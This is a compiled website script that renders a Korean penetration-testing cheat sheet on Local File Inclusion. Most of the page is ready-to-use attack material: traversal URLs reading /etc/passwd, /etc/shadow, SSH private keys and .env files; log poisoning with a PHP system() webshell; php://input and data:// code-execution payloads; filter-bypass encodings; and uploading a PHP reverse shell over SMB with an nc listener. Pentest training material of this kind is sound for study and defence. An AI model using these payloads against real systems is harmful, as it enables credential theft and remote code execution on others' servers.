"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[1271],{28453:(e,n,l)=>{l.d(n,{R:()=>a,x:()=>r});var s=l(96540);const i={},t=s.createContext(i);function a(e){const n=s.useContext(t);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(t.Provider,{value:n},e.children)}},61910:(e,n,l)=>{l.r(n),l.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>h});const s=JSON.parse('{"id":"penetration/exploitation/web-attacks/lfi","title":"LFI (Local File Inclusion)","description":"\uac1c\ub150","source":"@site/docs/penetration/exploitation/web-attacks/lfi.md","sourceDirName":"penetration/exploitation/web-attacks","slug":"/penetration/exploitation/web-attacks/lfi","permalink":"/my-docusaurus-page/penetration/exploitation/web-attacks/lfi","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"sidebar_position":1,"title":"LFI (Local File Inclusion)"},"sidebar":"tutorialSidebar","previous":{"title":"Web Attacks","permalink":"/my-docusaurus-page/category/web-attacks"},"next":{"title":"Command Injection","permalink":"/my-docusaurus-page/penetration/exploitation/web-attacks/command-injection"}}');var i=l(74848),t=l(28453);const a={sidebar_position:1,title:"LFI (Local File Inclusion)"},r="LFI (Local File Inclusion)",c={},h=[{value:"\uac1c\ub150",id:"\uac1c\ub150",level:2},{value:"\uacf5\uaca9 \uc608\uc2dc",id:"\uacf5\uaca9-\uc608\uc2dc",level:3},{value:"\uacf5\uaca9 \uc870\uac74",id:"\uacf5\uaca9-\uc870\uac74",level:2},{value:"\uc8fc\uc694 \ud0c0\uac9f \ud30c\uc77c",id:"\uc8fc\uc694-\ud0c0\uac9f-\ud30c\uc77c",level:2},{value:"\uc2dc\uc2a4\ud15c \ud30c\uc77c",id:"\uc2dc\uc2a4\ud15c-\ud30c\uc77c",level:3},{value:"\uc11c\ube44\uc2a4 \uc124\uc815 \ud30c\uc77c",id:"\uc11c\ube44\uc2a4-\uc124\uc815-\ud30c\uc77c",level:3},{value:"\uc0ac\uc6a9\uc790 \ud30c\uc77c",id:"\uc0ac\uc6a9\uc790-\ud30c\uc77c",level:3},{value:"\uc6f9 \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ud30c\uc77c",id:"\uc6f9-\uc560\ud50c\ub9ac\ucf00\uc774\uc158-\ud30c\uc77c",level:3},{value:"\uae30\ubcf8 LFI \uacf5\uaca9",id:"\uae30\ubcf8-lfi-\uacf5\uaca9",level:2},{value:"LFI to RCE (\ucf54\ub4dc \uc2e4\ud589)",id:"lfi-to-rce-\ucf54\ub4dc-\uc2e4\ud589",level:2},{value:"SMB + LFI \uc870\ud569",id:"smb--lfi-\uc870\ud569",level:3},{value:"Log Poisoning",id:"log-poisoning",level:3},{value:"PHP Wrapper \ud65c\uc6a9",id:"php-wrapper-\ud65c\uc6a9",level:2},{value:"php://filter (Base64 \uc778\ucf54\ub529)",id:"phpfilter-base64-\uc778\ucf54\ub529",level:3},{value:"php://input (POST \ub370\uc774\ud130 \uc2e4\ud589)",id:"phpinput-post-\ub370\uc774\ud130-\uc2e4\ud589",level:3},{value:"data:// (\ub370\uc774\ud130 URI)",id:"data-\ub370\uc774\ud130-uri",level:3},{value:"\uc6b0\ud68c \uae30\ubc95",id:"\uc6b0\ud68c-\uae30\ubc95",level:2},{value:"Null Byte (PHP &lt; 5.3.4)",id:"null-byte-php--534",level:3},{value:"\uc774\uc911 \uc778\ucf54\ub529",id:"\uc774\uc911-\uc778\ucf54\ub529",level:3},{value:"\ud544\ud130 \uc6b0\ud68c",id:"\ud544\ud130-\uc6b0\ud68c",level:3},{value:"\uc8fc\uc694 \uba85\ub839\uc5b4 \uc694\uc57d",id:"\uc8fc\uc694-\uba85\ub839\uc5b4-\uc694\uc57d",level:2},{value:"\uc790\ub3d9\ud654 \ub3c4\uad6c",id:"\uc790\ub3d9\ud654-\ub3c4\uad6c",level:2},{value:"LFISuite",id:"lfisuite",level:3},{value:"dotdotpwn",id:"dotdotpwn",level:3},{value:"\uc2e4\ubb34 \ud301",id:"\uc2e4\ubb34-\ud301",level:2}];function p(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,t.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"lfi-local-file-inclusion",children:"LFI (Local File Inclusion)"})}),"\n",(0,i.jsx)(n.h2,{id:"\uac1c\ub150",children:"\uac1c\ub150"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"LFI"}),": \uc6f9 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 \ud30c\uc77c\uc744 \ud3ec\ud568\uc2dc\ud0ac \ub54c, \uacf5\uaca9\uc790\uac00 \uc6d0\ud558\ub294 \ud30c\uc77c\uc744 \uc77d\ub3c4\ub85d \ud558\ub294 \ucde8\uc57d\uc810"]}),"\n",(0,i.jsx)(n.h3,{id:"\uacf5\uaca9-\uc608\uc2dc",children:"\uacf5\uaca9 \uc608\uc2dc"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"http://example.com/index.php?file=../../../../../etc/passwd\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uacf5\uaca9-\uc870\uac74",children:"\uacf5\uaca9 \uc870\uac74"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"\uc785\ub825 \uac80\uc99d \ubd80\uc7ac"}),": \uacbd\ub85c \ubcc0\uacbd \uac00\ub2a5 (",(0,i.jsx)(n.code,{children:"../../"}),")"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"\ud30c\uc77c \uc77d\uae30 \uad8c\ud55c"}),": \uc6f9 \ud504\ub85c\uc138\uc2a4 \uc18c\uc720\uc790\uac00 \uc77d\uc744 \uc218 \uc788\uc5b4\uc57c \ud568"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"\ud30c\uc77c \uc874\uc7ac"}),": \ud30c\uc77c \uc2dc\uc2a4\ud15c\uc5d0 \ud30c\uc77c\uc774 \uc788\uc5b4\uc57c \ud568"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\uc8fc\uc694-\ud0c0\uac9f-\ud30c\uc77c",children:"\uc8fc\uc694 \ud0c0\uac9f \ud30c\uc77c"}),"\n",(0,i.jsx)(n.h3,{id:"\uc2dc\uc2a4\ud15c-\ud30c\uc77c",children:"\uc2dc\uc2a4\ud15c \ud30c\uc77c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# \uc0ac\uc6a9\uc790 \uacc4\uc815 \uc815\ubcf4\n/etc/passwd\n\n# \ube44\ubc00\ubc88\ud638 \ud574\uc2dc (\uad8c\ud55c \ud544\uc694)\n/etc/shadow\n\n# \ud638\uc2a4\ud2b8 \ub9f5\ud551\n/etc/hosts\n\n# \uc6f9 \uc11c\ubc84 \ub85c\uadf8\n/var/log/apache2/access.log\n/var/log/nginx/access.log\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\uc11c\ube44\uc2a4-\uc124\uc815-\ud30c\uc77c",children:"\uc11c\ube44\uc2a4 \uc124\uc815 \ud30c\uc77c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Samba\n/etc/samba/smb.conf\n\n# NFS\n/etc/exports\n\n# MySQL\n/etc/mysql/my.cnf\n\n# Apache\n/etc/apache2/apache2.conf\n\n# Nginx\n/etc/nginx/nginx.conf\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\uc0ac\uc6a9\uc790-\ud30c\uc77c",children:"\uc0ac\uc6a9\uc790 \ud30c\uc77c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Bash \ud788\uc2a4\ud1a0\ub9ac\n/home/<user>/.bash_history\n\n# MySQL \ud788\uc2a4\ud1a0\ub9ac\n/home/<user>/.mysql_history\n\n# MySQL \uc124\uc815 (\ube44\ubc00\ubc88\ud638 \ud3ec\ud568 \uac00\ub2a5)\n/home/<user>/.my.cnf\n\n# SSH \uac1c\uc778\ud0a4\n/home/<user>/.ssh/id_rsa\n\n# SSH \uacf5\uac1c\ud0a4\n/home/<user>/.ssh/id_rsa.pub\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\uc6f9-\uc560\ud50c\ub9ac\ucf00\uc774\uc158-\ud30c\uc77c",children:"\uc6f9 \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ud30c\uc77c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# WordPress \uc124\uc815 (DB \uacc4\uc815 \uc815\ubcf4)\n/var/www/html/wp-config.php\n\n# \uc6f9 \ub8e8\ud2b8\n/var/www/html/index.php\n\n# \ud658\uacbd \ubcc0\uc218 \ud30c\uc77c\n/var/www/html/.env\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uae30\ubcf8-lfi-\uacf5\uaca9",children:"\uae30\ubcf8 LFI \uacf5\uaca9"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \ud30c\uc77c \uc77d\uae30\nhttp://<target>/page.php?file=/etc/passwd\n\n# \uacbd\ub85c \ud0d0\uc0c9\nhttp://<target>/page.php?file=../../../../../../etc/passwd\n\n# \ud604\uc7ac \ub514\ub809\ud1a0\ub9ac\nhttp://<target>/page.php?file=./config.php\n"})}),"\n",(0,i.jsx)(n.h2,{id:"lfi-to-rce-\ucf54\ub4dc-\uc2e4\ud589",children:"LFI to RCE (\ucf54\ub4dc \uc2e4\ud589)"}),"\n",(0,i.jsx)(n.h3,{id:"smb--lfi-\uc870\ud569",children:"SMB + LFI \uc870\ud569"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\uc2dc\ub098\ub9ac\uc624:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"SMB\uc5d0 \ud30c\uc77c \uc5c5\ub85c\ub4dc \uac00\ub2a5"}),"\n",(0,i.jsx)(n.li,{children:"LFI\ub85c \uc5c5\ub85c\ub4dc\ud55c \ud30c\uc77c \uc2e4\ud589"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# 1. Samba \uc124\uc815 \ud655\uc778\nhttp://<target>/lfi.php?file=/etc/samba/smb.conf\n\n# 2. PHP \ub9ac\ubc84\uc2a4 \uc258 \uc900\ube44\ncp /usr/share/webshells/php/php-reverse-shell.php .\nvim php-reverse-shell.php  # IP, Port \uc218\uc815\n\n# 3. SMB\ub85c \uc5c5\ub85c\ub4dc\nsmbclient \\\\\\\\<target>\\\\share\nsmb> put php-reverse-shell.php\n\n# 4. \ub9ac\uc2a4\ub108 \uc2dc\uc791\nnc -lvnp 1234\n\n# 5. LFI\ub85c \uc2e4\ud589\nhttp://<target>/lfi.php?file=/samba/php-reverse-shell.php\n"})}),"\n",(0,i.jsx)(n.h3,{id:"log-poisoning",children:"Log Poisoning"}),"\n",(0,i.jsx)(n.p,{children:"\uc6f9 \uc11c\ubc84 \ub85c\uadf8\uc5d0 PHP \ucf54\ub4dc \uc0bd\uc785 \ud6c4 \uc2e4\ud589:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# 1. User-Agent\uc5d0 PHP \ucf54\ub4dc \uc0bd\uc785\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<target>/\n\n# 2. LFI\ub85c \ub85c\uadf8 \ud30c\uc77c \uc2e4\ud589\nhttp://<target>/lfi.php?file=/var/log/apache2/access.log&cmd=id\n"})}),"\n",(0,i.jsx)(n.h2,{id:"php-wrapper-\ud65c\uc6a9",children:"PHP Wrapper \ud65c\uc6a9"}),"\n",(0,i.jsx)(n.h3,{id:"phpfilter-base64-\uc778\ucf54\ub529",children:"php://filter (Base64 \uc778\ucf54\ub529)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# PHP \uc18c\uc2a4\ucf54\ub4dc\ub97c Base64\ub85c \uc77d\uae30\nhttp://<target>/lfi.php?file=php://filter/convert.base64-encode/resource=index.php\n\n# Base64 \ub514\ucf54\ub529\necho "<base64>" | base64 -d\n'})}),"\n",(0,i.jsx)(n.h3,{id:"phpinput-post-\ub370\uc774\ud130-\uc2e4\ud589",children:"php://input (POST \ub370\uc774\ud130 \uc2e4\ud589)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# POST\ub85c PHP \ucf54\ub4dc \uc804\uc1a1\ncurl -X POST --data "<?php system(\'whoami\'); ?>" \\\n  "http://<target>/lfi.php?file=php://input"\n'})}),"\n",(0,i.jsx)(n.h3,{id:"data-\ub370\uc774\ud130-uri",children:"data:// (\ub370\uc774\ud130 URI)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# \uc9c1\uc811 PHP \ucf54\ub4dc \uc2e4\ud589\nhttp://<target>/lfi.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n# Base64: <?php system('id'); ?>\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uc6b0\ud68c-\uae30\ubc95",children:"\uc6b0\ud68c \uae30\ubc95"}),"\n",(0,i.jsx)(n.h3,{id:"null-byte-php--534",children:"Null Byte (PHP < 5.3.4)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"http://<target>/lfi.php?file=../../../../../etc/passwd%00\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\uc774\uc911-\uc778\ucf54\ub529",children:"\uc774\uc911 \uc778\ucf54\ub529"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# ../ \u2192 %2e%2e%2f \u2192 %252e%252e%252f\nhttp://<target>/lfi.php?file=%252e%252e%252f%252e%252e%252fetc/passwd\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\ud544\ud130-\uc6b0\ud68c",children:"\ud544\ud130 \uc6b0\ud68c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# ../ \ud544\ud130 \uc6b0\ud68c\n....//....//....//etc/passwd\n\n# \uc808\ub300 \uacbd\ub85c\n/var/www/../../etc/passwd\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uc8fc\uc694-\uba85\ub839\uc5b4-\uc694\uc57d",children:"\uc8fc\uc694 \uba85\ub839\uc5b4 \uc694\uc57d"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# \uae30\ubcf8 LFI\ncurl "http://<target>/lfi.php?file=/etc/passwd"\n\n# PHP Filter\ncurl "http://<target>/lfi.php?file=php://filter/convert.base64-encode/resource=config.php"\n\n# Log Poisoning\ncurl -A "<?php system(\'id\'); ?>" http://<target>/\ncurl "http://<target>/lfi.php?file=/var/log/apache2/access.log"\n\n# SMB \uc5c5\ub85c\ub4dc\nsmbclient \\\\\\\\<target>\\\\share\nput shell.php\n\n# LFI\ub85c \uc2e4\ud589\ncurl "http://<target>/lfi.php?file=/samba/shell.php"\n'})}),"\n",(0,i.jsx)(n.h2,{id:"\uc790\ub3d9\ud654-\ub3c4\uad6c",children:"\uc790\ub3d9\ud654 \ub3c4\uad6c"}),"\n",(0,i.jsx)(n.h3,{id:"lfisuite",children:"LFISuite"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"git clone https://github.com/D35m0nd142/LFISuite.git\ncd LFISuite\npython3 lfisuite.py\n"})}),"\n",(0,i.jsx)(n.h3,{id:"dotdotpwn",children:"dotdotpwn"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"dotdotpwn -m http -h <target> -x 80 -f /etc/passwd\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\uc2e4\ubb34-\ud301",children:"\uc2e4\ubb34 \ud301"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u26a0\ufe0f \ud30c\uc77c \uc5c5\ub85c\ub4dc \ud6c4 \ud56d\uc0c1 \uc0ad\uc81c \ubc0f \ubb38\uc11c\ud654"}),"\n",(0,i.jsxs)(n.li,{children:["\ub79c\ub364 \ud30c\uc77c\uba85 \uc0ac\uc6a9 (\uc608: ",(0,i.jsx)(n.code,{children:"abc123xyz.php"}),")"]}),"\n",(0,i.jsx)(n.li,{children:"LFI \ubc1c\uacac \uc2dc \uc124\uc815 \ud30c\uc77c\ubd80\ud130 \ud655\uc778"}),"\n",(0,i.jsx)(n.li,{children:"\ub2e4\ub978 \ucde8\uc57d\uc810\uacfc \uc870\ud569\ud558\uc5ec \uacf5\uaca9"}),"\n"]})]})}function d(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(p,{...e})}):p(e)}}}]);